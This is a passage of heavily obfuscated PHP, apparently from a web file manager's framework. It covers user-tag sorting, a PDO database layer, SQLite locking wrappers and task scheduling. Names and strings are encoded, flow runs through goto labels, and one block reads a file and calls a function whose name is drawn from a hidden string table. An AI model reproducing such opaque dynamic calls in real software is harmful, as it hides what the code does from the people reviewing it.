$GLOBALS[$¹×¦œ’¡[6]][$¹×¦œ’¡[2398]]; } if ($ùö·¿Âä == $¹×¦œ’¡[2399]) { return $GLOBALS[$¹×¦œ’¡[6]][$¹×¦œ’¡[2400]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\x2e\x74\x61\x67\114\151\163\x74"; public $modelType = "\125\x73\x65\x72\x4f\160\x74\x69\157\156"; public $field = array("\156\x61\155\x65", "\163\x74\x79\x6c\x65", "\x73\157\x72\164"); public function listData($»ä‘êû = false, $©âã¹àï = "\163\157\162\164", $‰…Œ¸Ï¹ = false) { return parent::listData($»ä‘êû, $©âã¹àï, $‰…Œ¸Ï¹); } public function remove($ğæ©üù©) { return parent::remove($ğæ©üù©); } public function add($“³£ºÃ, $ñ¹°Ş = "\x6c\x61\142\145\x6c\55\x67\x72\x65\171\x2d\156\157\x72\155\141\154") { $ğÊ©×Åœ =& $_SERVER[ò«¥Ê‡å]; if ($this->findByName($“³£ºÃ)) { return !1; } $‡Ô¤çñ› = array($ğÊ©×Åœ[464] => $“³£ºÃ, $ğÊ©×Åœ[529] => $ñ¹°Ş, $ğÊ©×Åœ[1903] => $this->getSort($ğÊ©×Åœ[304]) + 1); return parent::insert($‡Ô¤çñ›); } public function update($ÔŞˆäŠ”, $¥¥‹îöÌ) { $ œñÙøü =& $_SERVER[ò«¥Ê‡å]; $Á€¹Òó‹ = $this->listData($ÔŞˆäŠ”); $ó”â–Äí = $this->findByName($¥¥‹îöÌ[$ œñÙøü[32]]); if (!$Á€¹Òó‹ || $ó”â–Äí && $ó”â–Äí[$ œñÙøü[445]] != $Á€¹Òó‹[$ œñÙøü[445]]) { return !1; } return parent::update($ÔŞˆäŠ”, $¥¥‹îöÌ); } public function moveTop($ÍÙœå³Ù) { $·şÒ—œä =& $_SERVER[ò«¥Ê‡å]; $– Ó£©× = parent::listData(); $¾èßà¦Û = $this->getSort($·şÒ—œä[303]); foreach ($– Ó£©× as &$¶ïÙˆ¹õ) { if ($¶ïÙˆ¹õ[$·şÒ—œä[445]] == $ÍÙœå³Ù) { $¶ïÙˆ¹õ[$·şÒ—œä[1923]] = $¾èßà¦Û; continue; } $¶ïÙˆ¹õ[$·şÒ—œä[1923]] += 1; } unset($¶ïÙˆ¹õ); return parent::resetData($– Ó£©×); } public function moveBottom($Ç®ñ¡šƒ) { $‰øİ†ˆ =& $_SERVER[ò«¥Ê‡å]; $Îßğ’” = $this->getSort($‰øİ†ˆ[304]) + 1; return parent::update($Ç®ñ¡šƒ, array($‰øİ†ˆ[1923] => $Îßğ’”)); } public function resetSort($—¢ÊÚ¦) { $ĞÊ¡‹îö =& $_SERVER[ò«¥Ê‡å]; $òÉ¬Ãßå = array(); $—¢ÊÚ¦ = is_array($—¢ÊÚ¦) ? $—¢ÊÚ¦ : array(); for ($Šà…ê± = 0; $Šà…ê± < count($—¢ÊÚ¦); $Šà…ê±++) { $òÉ¬Ãßå[$—¢ÊÚ¦[$Šà…ê±] . $ĞÊ¡‹îö[12]] = $Šà…ê± + 1; } $âç©éôá = parent::listData(); foreach ($âç©éôá as &$¤ÆÃÜ¼ø) { $§±™ÇÖ = $òÉ¬Ãßå[$¤ÆÃÜ¼ø[$ĞÊ¡‹îö[445]]]; $¤ÆÃÜ¼ø[$ĞÊ¡‹îö[1923]] = $§±™ÇÖ ? $§±™ÇÖ : $¤ÆÃÜ¼ø[$ĞÊ¡‹îö[1923]]; } unset($¤ÆÃÜ¼ø); return parent::resetData($âç©éôá); } private function getSort($ˆÖçÃâ™) { $ô××êòÄ =& $_SERVER[ò«¥Ê‡å]; $•Ãí Äâ = parent::listData(); $˜˜„ÄÅã = array_to_keyvalue($•Ãí Äâ, $ô××êòÄ[12], $ô××êòÄ[1923]); if (!$˜˜„ÄÅã) { $˜˜„ÄÅã = array(0); } $ûÌëìä = $ˆÖçÃâ™ == $ô××êòÄ[304] ? max($˜˜„ÄÅã) : min($˜˜„ÄÅã); return intval($ûÌëìä); } } goto aÊèŞ¾¸×æ; f¥ŠŒ—‹ÏŞ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($‘‚œÆ = '') { $Æ¦ƒæ©Ï =& $_SERVER[ò«¥Ê‡å]; if (!class_exists($Æ¦ƒæ©Ï[961])) { think_exception(think_lang($Æ¦ƒæ©Ï[14]) . $Æ¦ƒæ©Ï[962]); } if (!empty($‘‚œÆ)) { $this->config = $‘‚œÆ; if (empty($this->config[$Æ¦ƒæ©Ï[17]])) { $this->config[$Æ¦ƒæ©Ï[17]] = array(); } } } public function connect($”æÉ¦–æ = '', $×¸­–•¹ = 0) { $ÊÓÎ™å =& $_SERVER[ò«¥Ê‡å]; if (!isset($this->linkID[$×¸­–•¹])) { if (empty($”æÉ¦–æ)) { $”æÉ¦–æ = $this->config; } $¡Ã‘—Õ’ = !empty($”æÉ¦–æ[$ÊÓÎ™å[17]][$ÊÓÎ™å[18]]) ? $”æÉ¦–æ[$ÊÓÎ™å[17]][$ÊÓÎ™å[18]] : $this->pconnect; if ($¡Ã‘—Õ’) { $”æÉ¦–æ[$ÊÓÎ™å[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$×¸­–•¹] = new PDO($”æÉ¦–æ[$ÊÓÎ™å[963]], $”æÉ¦–æ[$ÊÓÎ™å[935]], $”æÉ¦–æ[$ÊÓÎ™å[936]], $”æÉ¦–æ[$ÊÓÎ™å[17]]); } catch (PDOException $Ìóº€ïÉ) { think_exception($Ìóº€ïÉ->getMessage()); } $this->dbType = $this->_getDsnType($”æÉ¦–æ[$ÊÓÎ™å[963]]); if (in_array($this->dbType, array($ÊÓÎ™å[964], $ÊÓÎ™å[965], $ÊÓÎ™å[966], $ÊÓÎ™å[967]))) { think_exception($ÊÓÎ™å[968] . $this->dbType . $ÊÓÎ™å[969] . $this->dbType . $ÊÓÎ™å[970]); } if (!$this->linkID[$×¸­–•¹]) { think_exception($ÊÓÎ™å[971]); } try { $this->linkID[$×¸­–•¹]->exec($ÊÓÎ™å[972] . think_config($ÊÓÎ™å[938])); } catch (Exception $Ìóº€ïÉ) { } $this->connected = !0; if (1 != think_config($ÊÓÎ™å[22])) { unset($this->config); } } return $this->linkID[$×¸­–•¹]; } public function free() { $this->PDOStatement = null; } public function query($Áå£âÕë, $‹ØŸ¢´ƒ = array()) { $îÇÁÇ÷Î =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Áå£âÕë; if (!empty($‹ØŸ¢´ƒ)) { $this->queryStr .= $îÇÁÇ÷Î[973] . print_r($‹ØŸ¢´ƒ, !0) . $îÇÁÇ÷Î[974]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($îÇÁÇ÷Î[23], 1); think_status($îÇÁÇ÷Î[24]); $this->PDOStatement = $this->_linkID->prepare($Áå£âÕë); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÌÓÅ¸Œ = $this->PDOStatement->execute($‹ØŸ¢´ƒ); $this->debug(); if (!1 === $ÌÓÅ¸Œ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ŒÂüäôè, $¦§¼¿Û = array()) { $“²Ø£¨÷ =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŒÂüäôè; if (!empty($¦§¼¿Û)) { $this->queryStr .= $“²Ø£¨÷[973] . print_r($¦§¼¿Û, !0) . $“²Ø£¨÷[974]; } $™Å«±œ¤ = !1; if ($this->dbType == $“²Ø£¨÷[967]) { if (preg_match($“²Ø£¨÷[975], $this->queryStr, $¨õÄ¥¥)) { $this->table = think_config($“²Ø£¨÷[976]) . str_ireplace(think_config($“²Ø£¨÷[977]), $“²Ø£¨÷[424], $¨õÄ¥¥[2]); $™Å«±œ¤ = (bool) $this->query($“²Ø£¨÷[978] . strtoupper($this->table) . $“²Ø£¨÷[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($“²Ø£¨÷[25], 1); think_status($“²Ø£¨÷[24]); $this->PDOStatement = $this->_linkID->prepare($ŒÂüäôè); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ä’¢Ü¬ = $this->PDOStatement->execute($¦§¼¿Û); $this->debug(); if (!1 === $Ä’¢Ü¬) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($™Å«±œ¤ || preg_match($“²Ø£¨÷[979], $ŒÂüäôè)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ş©í‹û = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ş©í‹û) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ŠÕúŒë• = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ŠÕúŒë•) { $this->error(); return !1; } } return !0; } private function getAll() { $Ş½­êÎæ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ş½­êÎæ); return $Ş½­êÎæ; } public function getFields($äœÛøƒî) { $‹º…‹¯ï =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!0); if (think_config($‹º…‹¯ï[980])) { $®êÆ¤˜ = str_replace($‹º…‹¯ï[981], $äœÛøƒî, think_config($‹º…‹¯ï[980])); } else { switch ($this->dbType) { case $‹º…‹¯ï[964]: case $‹º…‹¯ï[982]: $®êÆ¤˜ = "\x53\x45\114\105\103\124\40\40\40\x63\157\x6c\165\x6d\x6e\x5f\156\141\x6d\x65\x20\141\x73\x20\x27\x4e\x61\155\145\x27\x2c\x20\40\40\144\141\164\x61\137\x74\x79\x70\145\x20\x61\x73\40\47\124\x79\x70\145\47\x2c\x20\40\40\143\x6f\x6c\x75\x6d\x6e\137\144\145\146\x61\165\x6c\164\x20\x61\163\x20\47\104\145\146\x61\x75\x6c\x74\x27\54\40\x20\40\x69\163\137\156\x75\154\154\x61\x62\x6c\145\40\x61\x73\40\47\x4e\165\x6c\x6c\x27\12\x9\11\x46\122\117\115\11\x69\156\146\x6f\x72\x6d\141\164\151\157\x6e\137\163\143\150\x65\155\141\56\x74\141\x62\154\145\x73\40\101\x53\40\164\12\x9\11\x4a\117\x49\x4e\11\151\x6e\146\157\162\x6d\141\x74\x69\157\156\x5f\163\143\x68\x65\155\141\56\x63\157\x6c\x75\x6d\156\163\40\x41\x53\x20\x63\xa\x9\x9\x4f\x4e\x20\40\x74\56\x74\x61\142\x6c\x65\137\143\141\164\x61\154\157\x67\x20\x3d\x20\x63\x2e\x74\x61\x62\154\x65\137\x63\x61\x74\x61\x6c\x6f\147\xa\x9\x9\x41\x4e\104\x20\164\56\164\x61\142\154\x65\137\x73\x63\150\145\155\x61\40\x3d\x20\143\x2e\x74\x61\x62\154\145\137\x73\143\150\x65\155\141\xa\11\11\x41\x4e\x44\40\164\56\x74\x61\x62\x6c\x65\137\x6e\x61\x6d\145\40\75\40\143\x2e\x74\141\142\x6c\x65\x5f\x6e\141\155\x65\12\11\11\127\x48\105\122\x45\40\x20\x20\x74\56\x74\141\142\x6c\145\x5f\156\141\155\145\40\75\40\x27{$äœÛøƒî}\47"; break; case $‹º…‹¯ï[983]: $®êÆ¤˜ = $‹º…‹¯ï[984] . $äœÛøƒî . $‹º…‹¯ï[985]; break; case $‹º…‹¯ï[965]: case $‹º…‹¯ï[967]: $®êÆ¤˜ = $‹º…‹¯ï[986] . $‹º…‹¯ï[987] . $‹º…‹¯ï[988] . strtoupper($äœÛøƒî) . $‹º…‹¯ï[989] . strtoupper($äœÛøƒî) . $‹º…‹¯ï[990]; break; case $‹º…‹¯ï[991]: $®êÆ¤˜ = $‹º…‹¯ï[992] . $äœÛøƒî . $‹º…‹¯ï[993]; break; case $‹º…‹¯ï[966]: break; case $‹º…‹¯ï[994]: default: $®êÆ¤˜ = $‹º…‹¯ï[995] . ($this->dbType == $‹º…‹¯ï[994] ? "\140{$äœÛøƒî}\140" : $äœÛøƒî); } } $˜ŠšŒÜ– = $this->query($®êÆ¤˜); $øŠŸªõè = array(); if ($˜ŠšŒÜ–) { foreach ($˜ŠšŒÜ– as $›İ¼¿ÜÛ => $æõÚ™âü) { $æõÚ™âü = array_change_key_case($æõÚ™âü); $æõÚ™âü[$‹º…‹¯ï[32]] = isset($æõÚ™âü[$‹º…‹¯ï[32]]) ? $æõÚ™âü[$‹º…‹¯ï[32]] : $‹º…‹¯ï[424]; $æõÚ™âü[$‹º…‹¯ï[33]] = isset($æõÚ™âü[$‹º…‹¯ï[33]]) ? $æõÚ™âü[$‹º…‹¯ï[33]] : $‹º…‹¯ï[424]; $¾£Û‹êé = isset($æõÚ™âü[$‹º…‹¯ï[319]]) ? $æõÚ™âü[$‹º…‹¯ï[319]] : $æõÚ™âü[$‹º…‹¯ï[32]]; $øŠŸªõè[$¾£Û‹êé] = array($‹º…‹¯ï[32] => $¾£Û‹êé, $‹º…‹¯ï[33] => $æõÚ™âü[$‹º…‹¯ï[33]], $‹º…‹¯ï[35] => (bool) (isset($æõÚ™âü[$‹º…‹¯ï[105]]) && $æõÚ™âü[$‹º…‹¯ï[105]] === $‹º…‹¯ï[12] || isset($æõÚ™âü[$‹º…‹¯ï[35]]) && $æõÚ™âü[$‹º…‹¯ï[35]] === $‹º…‹¯ï[12]), $‹º…‹¯ï[37] => isset($æõÚ™âü[$‹º…‹¯ï[37]]) ? $æõÚ™âü[$‹º…‹¯ï[37]] : (isset($æõÚ™âü[$‹º…‹¯ï[56]]) ? $æõÚ™âü[$‹º…‹¯ï[56]] : $‹º…‹¯ï[424]), $‹º…‹¯ï[39] => isset($æõÚ™âü[$‹º…‹¯ï[96]]) ? strtolower($æõÚ™âü[$‹º…‹¯ï[96]]) == $‹º…‹¯ï[41] : (isset($æõÚ™âü[$‹º…‹¯ï[57]]) ? $æõÚ™âü[$‹º…‹¯ï[57]] : !1), $‹º…‹¯ï[42] => isset($æõÚ™âü[$‹º…‹¯ï[996]]) ? strtolower($æõÚ™âü[$‹º…‹¯ï[996]]) == $‹º…‹¯ï[44] : (isset($æõÚ™âü[$‹º…‹¯ï[96]]) ? $æõÚ™âü[$‹º…‹¯ï[96]] : !1)); } } return $øŠŸªõè; } public function getTables($ìşºí²… = '') { $´êÙ›İÄ =& $_SERVER[ò«¥Ê‡å]; if (think_config($´êÙ›İÄ[997])) { $İÁİ§‹İ = str_replace($´êÙ›İÄ[998], $ìşºí²…, think_config($´êÙ›İÄ[997])); } else { switch ($this->dbType) { case $´êÙ›İÄ[965]: case $´êÙ›İÄ[967]: $İÁİ§‹İ = $´êÙ›İÄ[999]; break; case $´êÙ›İÄ[964]: case $´êÙ›İÄ[982]: $İÁİ§‹İ = $´êÙ›İÄ[1000]; break; case $´êÙ›İÄ[991]: $İÁİ§‹İ = $´êÙ›İÄ[1001]; break; case $´êÙ›İÄ[966]: think_exception(think_lang($´êÙ›İÄ[1002]) . $´êÙ›İÄ[1003]); break; case $´êÙ›İÄ[983]: $İÁİ§‹İ = $´êÙ›İÄ[45] . $´êÙ›İÄ[46] . $´êÙ›İÄ[47]; break; case $´êÙ›İÄ[994]: default: if (!empty($ìşºí²…)) { $İÁİ§‹İ = $´êÙ›İÄ[946] . $ìşºí²… . $´êÙ›İÄ[947]; } else { $İÁİ§‹İ = $´êÙ›İÄ[948]; } } } $¼äïÃìå = $this->query($İÁİ§‹İ); $É‹ÌëĞ = array(); foreach ($¼äïÃìå as $µòïµ‘§ => $ÔŸ®Ğè›) { $É‹ÌëĞ[$µòïµ‘§] = current($ÔŸ®Ğè›); } return $É‹ÌëĞ; } protected function parseLimit($Ç’¨ØÎµ) { $œÍ‹ÈÙÑ =& $_SERVER[ò«¥Ê‡å]; $ïßüè£Â = $œÍ‹ÈÙÑ[12]; if (!empty($Ç’¨ØÎµ)) { switch ($this->dbType) { case $œÍ‹ÈÙÑ[991]: case $œÍ‹ÈÙÑ[983]: $Ç’¨ØÎµ = explode($œÍ‹ÈÙÑ[50], $Ç’¨ØÎµ); if (count($Ç’¨ØÎµ) > 1) { $ïßüè£Â .= $œÍ‹ÈÙÑ[51] . $Ç’¨ØÎµ[1] . $œÍ‹ÈÙÑ[52] . $Ç’¨ØÎµ[0] . $œÍ‹ÈÙÑ[53]; } else { $ïßüè£Â .= $œÍ‹ÈÙÑ[51] . $Ç’¨ØÎµ[0] . $œÍ‹ÈÙÑ[53]; } break; case $œÍ‹ÈÙÑ[964]: case $œÍ‹ÈÙÑ[982]: break; case $œÍ‹ÈÙÑ[966]: break; case $œÍ‹ÈÙÑ[965]: case $œÍ‹ÈÙÑ[967]: break; case $œÍ‹ÈÙÑ[994]: default: $ïßüè£Â .= $œÍ‹ÈÙÑ[51] . $Ç’¨ØÎµ . $œÍ‹ÈÙÑ[53]; } } return $ïßüè£Â; } public function parseKey(&$êÜ‡Ä“Ş, $ß’¹Èƒ = true) { $ãÒˆ—ã =& $_SERVER[ò«¥Ê‡å]; if ($ß’¹Èƒ) { $êÜ‡Ä“Ş = $this->parseKeyCheck($êÜ‡Ä“Ş); } if ($this->dbType == $ãÒˆ—ã[994]) { if ($êÜ‡Ä“Ş != $ãÒˆ—ã[205] && !preg_match($ãÒˆ—ã[958], $êÜ‡Ä“Ş)) { $êÜ‡Ä“Ş = $ãÒˆ—ã[431] . trim($êÜ‡Ä“Ş, $ãÒˆ—ã[431]) . $ãÒˆ—ã[431]; } return $êÜ‡Ä“Ş; } else { return parent::parseKey($êÜ‡Ä“Ş, $ß’¹Èƒ); } } public function close() { $this->_linkID = null; } public function error() { $ƒô¸ŠÌ =& $_SERVER[ò«¥Ê‡å]; if ($this->PDOStatement) { $‡àÈ‚ñ˜ = $this->PDOStatement->errorInfo(); $this->error = $‡àÈ‚ñ˜[1] . $ƒô¸ŠÌ[4] . $‡àÈ‚ñ˜[2]; } else { $this->error = $ƒô¸ŠÌ[12]; } if ($ƒô¸ŠÌ[12] != $this->queryStr) { $this->error .= LNG($ƒô¸ŠÌ[48]) . $this->queryStr; } think_trace($this->error, $ƒô¸ŠÌ[12], $ƒô¸ŠÌ[49]); return $this->error; } public function escapeString($±µêó°Í) { $Æèå×ä =& $_SERVER[ò«¥Ê‡å]; switch ($this->dbType) { case $Æèå×ä[991]: case $Æèå×ä[964]: case $Æèå×ä[982]: case $Æèå×ä[994]: return addslashes($±µêó°Í); case $Æèå×ä[966]: case $Æèå×ä[983]: case $Æèå×ä[965]: case $Æèå×ä[967]: return str_ireplace($Æèå×ä[58], $Æèå×ä[59], $±µêó°Í); } } protected function parseValue($Æº¹—Şä) { $­¢› =& $_SERVER[ò«¥Ê‡å]; if (is_string($Æº¹—Şä)) { $ »˜¹‚¶ = strpos($Æº¹—Şä, $­¢›[4]) === 0 && in_array($Æº¹—Şä, array_keys($this->bind)); $Æº¹—Şä = $ »˜¹‚¶ ? $this->escapeString($Æº¹—Şä) : $­¢›[1004] . $this->escapeString($Æº¹—Şä) . $­¢›[1004]; } elseif (isset($Æº¹—Şä[0]) && is_string($Æº¹—Şä[0]) && strtolower($Æº¹—Şä[0]) == $­¢›[343]) { $Æº¹—Şä = $this->escapeString($Æº¹—Şä[1]); } elseif (is_array($Æº¹—Şä)) { $Æº¹—Şä = array_map(array($this, $­¢›[1005]), $Æº¹—Şä); } elseif (is_bool($Æº¹—Şä)) { $Æº¹—Şä = $Æº¹—Şä ? $­¢›[90] : $­¢›[214]; } elseif (is_null($Æº¹—Şä)) { $Æº¹—Şä = $­¢›[105]; } return $Æº¹—Şä; } public function getLastInsertId() { $¼î®ö–ö =& $_SERVER[ò«¥Ê‡å]; switch ($this->dbType) { case $¼î®ö–ö[991]: case $¼î®ö–ö[983]: case $¼î®ö–ö[964]: case $¼î®ö–ö[982]: case $¼î®ö–ö[966]: case $¼î®ö–ö[994]: return $this->_linkID->lastInsertId(); case $¼î®ö–ö[965]: case $¼î®ö–ö[967]: $ìŸ®Ü‡§ = $this->table; $³”Â¸Àš = $this->query("\x53\x45\x4c\105\103\124\40{$ìŸ®Ü‡§}\x2e\143\165\x72\x72\166\141\x6c\40\x63\165\x72\162\x76\141\154\40\106\122\x4f\115\x20\144\165\141\154"); return $³”Â¸Àš ? $³”Â¸Àš[0][$¼î®ö–ö[1006]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($¥‘¹È¦ç) { $ñå»×àÌ =& $_SERVER[ò«¥Ê‡å]; if (!CacheLock::fileLock($ñå»×àÌ[13])) { return !1; } $İºÈú¸¡ = parent::query($¥‘¹È¦ç); CacheLock::fileUnLock($ñå»×àÌ[13]); return $İºÈú¸¡; } public function execute($ä÷ÚÉ‡¡) { $³Ù€ûì¦ =& $_SERVER[ò«¥Ê‡å]; if (!CacheLock::fileLock($³Ù€ûì¦[13])) { return !1; } $õ™×® Ä = parent::execute($ä÷ÚÉ‡¡); CacheLock::fileUnLock($³Ù€ûì¦[13]); return $õ™×® Ä; } } class DbSqlite3 extends DbSqlite3Base { public function query($¬§†Š¥) { $½©¿É¨È =& $_SERVER[ò«¥Ê‡å]; if (!CacheLock::fileLock($½©¿É¨È[13])) { return !1; } $‰Ü«·Û˜ = parent::query($¬§†Š¥); CacheLock::fileUnLock($½©¿É¨È[13]); return $‰Ü«·Û˜; } public function execute($ÑóĞ¶îû) { $¨¦˜¡®ı =& $_SERVER[ò«¥Ê‡å]; if (!CacheLock::fileLock($¨¦˜¡®ı[13])) { return !1; } $ŞşïãÁÏ = parent::execute($ÑóĞ¶îû); CacheLock::fileUnLock($¨¦˜¡®ı[13]); return $ŞşïãÁÏ; } } goto Fˆğ®•Öğ“; A ºáÔõºˆ: define($_SERVER[ò«¥Ê‡å][287], 1); define($_SERVER[ò«¥Ê‡å][288], 0); define($_SERVER[ò«¥Ê‡å][289], 2); goto Eï ßäïï; dá¦íŠÚ”Æ: if ($_SERVER[$_SERVER[ò«¥Ê‡å][837]] != $_SERVER[$_SERVER[ò«¥Ê‡å][1556]]) { $_getc = $_SERVER[ò«¥Ê‡å][839]; $_getfile = $_SERVER[$_SERVER[ò«¥Ê‡å][840]] . $_SERVER[ò«¥Ê‡å][841]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ò«¥Ê‡å][248], $_getfilec); if (count($_getarrs) < $_SERVER[ò«¥Ê‡å][653]) { $exit = $_SERVER[ò«¥Ê‡å][842]; $exit(); } $_act = $_SERVER[ò«¥Ê‡å][843]; $_act($_SERVER[$_SERVER[ò«¥Ê‡å][838]]); } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($õ—‡ÅÖƒ, $ÆÒ–‹ş¹ = 5.0) { if (!$õ—‡ÅÖƒ) { return; } $ÕëÑàâ¸ = Cache::get($õ—‡ÅÖƒ); if (!$ÕëÑàâ¸ || timeFloat() - floatVal($ÕëÑàâ¸) >= $ÆÒ–‹ş¹) { Cache::set($õ—‡ÅÖƒ, timeFloat(), $ÆÒ–‹ş¹ * 10); return !0; } return !1; } public static function timeLimitCall($É•Ö‚ƒ‘, $ø£©•õ¿, $†¿´Šë¥, $’ËÁ¦Ûá = 5.0) { $¾õ™— =& $_SERVER[ò«¥Ê‡å]; if (!$É•Ö‚ƒ‘ || !$ø£©•õ¿) { return; } self::$asyncAdd = !0; $ëË‰„£ß = $¾õ™—[1807]; $ïöè²êó = Cache::get($ëË‰„£ß, !0); $¾²äŸï = array($¾õ™—[1808] => timeFloat(), $¾õ™—[1809] => timeFloat(), $¾õ™—[310] => $ø£©•õ¿, $¾õ™—[1799] => $†¿´Šë¥, $¾õ™—[196] => $’ËÁ¦Ûá); if (is_array($ïöè²êó[$É•Ö‚ƒ‘])) { $¾²äŸï[$¾õ™—[1809]] = $ïöè²êó[$É•Ö‚ƒ‘][$¾õ™—[1809]]; } if (is_array($ïöè²êó[$É•Ö‚ƒ‘])) { if (timeFloat() - $ïöè²êó[$É•Ö‚ƒ‘][$¾õ™—[1808]] < $¾²äŸï[$¾õ™—[196]] * 0.3) { return; } $¾²äŸï[$¾õ™—[1809]] = $ïöè²êó[$É•Ö‚ƒ‘][$¾õ™—[1809]]; } $ïöè²êó[$É•Ö‚ƒ‘] = $¾²äŸï; Cache::set($ëË‰„£ß, $ïöè²êó, 60); Cache::removeMemory($ëË‰„£ß); write_log($¾õ™—[1810] . $É•Ö‚ƒ‘ . $¾õ™—[73] . $ø£©•õ¿, $¾õ™—[187]); } public static function timeLimitCallLoop() { $×óÅ¶Ÿê =& $_SERVER[ò«¥Ê‡å]; $ã¢éØ»‡ = array($×óÅ¶Ÿê[1811]); $Ò®¡×É = in_array(strtolower(ACTION), $ã¢éØ»‡); if (!$Ò®¡×É && !self::$asyncAdd) { return; } $ÜÚ›û‰ = $×óÅ¶Ÿê[1807]; $ü’íÇÌ• = Cache::get($ÜÚ›û‰, !0); if (!$ü’íÇÌ• || count($ü’íÇÌ•) <= 0) { return; } $„Şñª§ = !1; $†™Ãá›ù = timeFloat(); $ß¤·Í‰ = array(); foreach ($ü’íÇÌ• as $ Åøñç => $¤ÔÉ‚à) { if ($†™Ãá›ù - $¤ÔÉ‚à[$×óÅ¶Ÿê[1809]] > $¤ÔÉ‚à[$×óÅ¶Ÿê[196]]) { $„Şñª§ = !0; try { Hook::apply($¤ÔÉ‚à[$×óÅ¶Ÿê[310]], $¤ÔÉ‚à[$×óÅ¶Ÿê[1799]]); write_log($×óÅ¶Ÿê[1812] . $ Åøñç . $×óÅ¶Ÿê[73] . $¤ÔÉ‚à[$×óÅ¶Ÿê[310]] . $×óÅ¶Ÿê[1813] . ACTION, $×óÅ¶Ÿê[187]); } catch (Exception $İÏÉ¶çÑ) { } continue; } $ß¤·Í‰[$ Åøñç] = $¤ÔÉ‚à; } if (!$„Şñª§) { return; } if (!$ß¤·Í‰) { return Cache::remove($ÜÚ›û‰); } Cache::set($ÜÚ›û‰, $ß¤·Í‰, 60); Cache::removeMemory($ÜÚ›û‰); } public static function finished($Ÿô‡°ô, $òÄ ê…Û) { $ÔÖ¡àÈ• =& $_SERVER[ò«¥Ê‡å]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÔÖ¡àÈ•[310] => $Ÿô‡°ô, $ÔÖ¡àÈ•[1799] => $òÄ ê…Û); } private static function finishedRun() { $ÎÙò—Äò =& $_SERVER[ò«¥Ê‡å]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Û„¨çÀ¿) { try { Hook::apply($Û„¨çÀ¿[$ÎÙò—Äò[310]], $Û„¨çÀ¿[$ÎÙò—Äò[1799]]); } catch (Exception $ƒò”) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ƒÃé£ =& $_SERVER[ò«¥Ê‡å]; parent::startAfter(); Hook::bind($ƒÃé£[1814], array($this, $ƒÃé£[1815])); Hook::bind($ƒÃé£[1240], array($this, $ƒÃé£[1816])); Hook::bind($ƒÃé£[1817], array($this, $ƒÃé£[1818])); $ÉÄŒ•œ† =& $this->task; $ÉÄŒ•œ†[$ƒÃé£[1819]] = $ƒÃé£[1241]; if (!$ÉÄŒ•œ†[$ƒÃé£[1591]]) { $ÉÄŒ•œ†[$ƒÃé£[1591]] = LNG($ƒÃé£[1820]); } } protected function endAfter() { $Ã”­ËñÍ =& $_SERVER[ò«¥Ê‡å]; parent::endAfter(); Hook::unbind($Ã”­ËñÍ[1814], array($this, $Ã”­ËñÍ[1815])); Hook::unbind($Ã”­ËñÍ[1240], array($this, $Ã”­ËñÍ[1816])); Hook::unbind($Ã”­ËñÍ[1817], array($this, $Ã”­ËñÍ[1818])); } public function updateAfter() { $Âˆ…Âåˆ =& $_SERVER[ò«¥Ê‡å]; $Ï„¦ä¯É =& $this->task; if (!$Ï„¦ä¯É[$Âˆ…Âåˆ[825]] || !$Ï„¦ä¯É[$Âˆ…Âåˆ[802]]) { if ($Ï„¦ä¯É[$Âˆ…Âåˆ[1819]] != $Âˆ…Âåˆ[359]) { return; } } if ($Ï„¦ä¯É[$Âˆ…Âåˆ[1819]] == $Âˆ…Âåˆ[1241]) { $úëˆİÄå = 0; if ($Ï„¦ä¯É[$Âˆ…Âåˆ[1754]]) { $úëˆİÄå = $Ï„¦ä¯É[$Âˆ…Âåˆ[1755]] / $Ï„¦ä¯É[$Âˆ…Âåˆ[1754]]; } $Ï„¦ä¯É[$Âˆ…Âåˆ[1703]] = $úëˆİÄå * 0.3; } else { if ($Ï„¦ä¯É[$Âˆ…Âåˆ[1819]] == $Âˆ…Âåˆ[359]) { $úëˆİÄå = $Ï„¦ä¯É[$Âˆ…Âåˆ[1702]] / $Ï„¦ä¯É[$Âˆ…Âåˆ[825]]; $Ï„¦ä¯É[$Âˆ…Âåˆ[1703]] = 0.3 + $úëˆİÄå * 0.4; } else { if ($Ï„¦ä¯É[$Âˆ…Âåˆ[1819]] == $Âˆ…Âåˆ[109]) { $ÀúŸûÓ¥ = 0; if ($Ï„¦ä¯É[$Âˆ…Âåˆ[1756]] == $Âˆ…Âåˆ[109]) { $ÀúŸûÓ¥ = $Ï„¦ä¯É[$Âˆ…Âåˆ[1755]]; } $úëˆİÄå = ($Ï„¦ä¯É[$Âˆ…Âåˆ[1759]] + $ÀúŸûÓ¥) / $Ï„¦ä¯É[$Âˆ…Âåˆ[802]]; $Ï„¦ä¯É[$Âˆ…Âåˆ[1703]] = 0.3 + 0.4 + $úëˆİÄå * 0.3; } } } if ($Ï„¦ä¯É[$Âˆ…Âåˆ[1703]] > 0) { $ä”éÒØ“ = timeFloat() - 